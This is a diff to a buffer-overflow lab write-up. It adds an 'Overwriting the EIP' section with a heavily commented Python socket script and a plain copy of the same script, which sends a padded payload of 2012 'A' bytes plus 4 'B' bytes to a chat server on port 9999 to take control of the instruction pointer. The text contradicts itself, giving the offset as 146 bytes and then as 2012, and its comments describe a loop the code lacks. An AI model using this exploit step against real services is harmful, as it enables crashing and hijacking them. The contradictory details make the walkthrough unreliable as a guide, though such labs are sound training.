@@ -244,6 +244,146 @@ print "A" * 5000
 
 ### Overwriting the EIP
 
+- We know that the offset for make the program crash and point exactly to the `EIP` is at `146 bytes`.
+
+    - **That means, `146 bytes` just before to get to the `EIP`**
+    
+    - **The `EIP` itself is `4 bytes` long** 
+    
+- So, we going to overwrite this specific `4 bytes` just after we fill those `2012` bytes ;)  
+
+    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
+    
+    - This will be saved as `1_fz3r0_brainstorm.py`  
+
+```python
+    # We declare we are using python:
+    
+#!/usr/bin/python
+
+    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
+    # Very similar to netcat
+    
+import socket
+
+    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
+    # For example: "print(sys.version)" will bring something like "id" linux bash command.
+    
+import sys
+
+    # 1 - The "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
+    #     variable ---> username
+    #     b        ---> "b" is used before the string to send the string as Bytes and no as String
+    
+username = b"fz3r0"
+
+    # 2 - The "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
+    #     variable ---> message
+    
+        # =-=-=-=-=-=-=-=-= The variable message contains the next trick! =-=-=-=-=-=-=-=-=-=-=
+    
+        # "A" * 2012    ---> I'll send 2012 bytes (A's) each time
+        #                    Remember, 2012 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
+        
+        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 
+
+        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
+        
+message = b"A" * 2012 + b"B" * 4
+
+    # The script will start the loop with "try"
+    # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 
+
+try:
+        
+            # Print message to console:
+        
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
+        
+            # I'll use the socket module to create the variable "s"
+            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
+            # We will define out RHOST & RPORT (Target/Windows 10 > chatserver.exe)
+        
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))
+        
+            # Once it connects with the RHOST, the script will recieve "intro" Data back from it (The welcome message and that stuff...)
+            # It could work with one line, but for double checking I will try to recieve 2 packages just in case (maybe the "intro" of the program is divided in 2 load screen or something...)
+            
+        s.recv(1024)
+        s.recv(1024)
+
+            # Once it connects with the RHOST, and recieve the "intro" data, the program start to prompt for data.
+            # I will use the Socket Module and variable "s" to send data to the chatserver
+            
+                # 1. First, "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
+                
+                    # send      = "send this"
+                    # username  = "fz3r0"
+                    # '\r\n\'   = \return \new line (like pressing "enter")
+                    # b         = "b" is used before the string to send the string as Bytes and no as String"
+
+        s.send(username + b'\r\n')
+
+            # Recieve data again (I'm sure is only 1 package this time, the prompt for the message)
+            # So, here I recieve the "message prompt" from the server:
+             
+        s.recv(1024)
+                
+                # 2 - Then, "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
+                    
+                    # send      = "send this"
+                    # message   = "b"A" * 2012 + b"B" * 4" (++++ tricky payload ++++)
+                    # '\r\n\'   = \return \new line (like pressing "enter")
+                    # b         = "b" is used before the string to send the string as Bytes and no as String"
+
+        s.send(message + b'\r\n')
+       
+            # Recieve data again
+            
+        s.recv(1024)
+       
+            # Close connection with RHOST
+            # End of the loop
+       
+        s.close()
+
+    # Exception script in case some error happen, return a message and exit. 
+
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        sys.exit()
+```
+
+- **No comment version:**
+
+```python  
+#!/usr/bin/python
+
+import socket
+import sys
+
+username = b"fz3r0"
+message = b"A" * 2012 + b"B" * 4
+
+try:        
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))      
+        s.recv(1024)
+        s.recv(1024)
+        s.send(username + b'\r\n')
+        s.recv(1024)
+        s.send(message + b'\r\n')    
+        s.recv(1024)
+        s.close()
+        
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        sys.exit()
+```
+
+- `chmod +x` to the script to make it executable:
 
 
 
